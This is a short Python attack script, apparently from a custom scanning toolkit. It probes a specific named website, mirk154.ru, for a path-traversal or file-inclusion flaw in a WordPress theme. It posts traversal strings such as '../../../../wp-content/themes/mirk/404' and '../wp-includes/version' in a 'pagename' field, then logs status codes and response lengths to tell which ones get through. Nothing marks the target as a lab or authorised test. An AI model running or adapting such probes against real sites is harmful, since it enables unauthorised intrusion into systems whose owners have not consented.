from core import http, vuln

h = "mirk154.ru"
CT = "application/x-www-form-urlencoded"

def post(pname, pid=4430):
    body = ("page_id=%d&pagename=%s" % (pid, vuln._denc(pname))).encode()
    return http.request(h, "/", method="POST", body=body, ctype=CT, tries=1)

r = http.request(h, "/", tries=1)
print("GET базовая:", r.status_code, len(r.text or ""))

for p in ["templates/../../../../wp-content/themes/mirk/404",
          "templates/../../wp-content/themes/mirk/404",
          "templates/../../../wp-content/themes/mirk/404",
          "templates/../../../../wp-includes/version",
          "/wp-content/themes/mirk/404"]:
    try:
        x = post(p)
    except Exception as e:
        print("EXC", type(e).__name__, p); continue
    t = x.text or ""
    print(x.status_code, len(t), "|", p)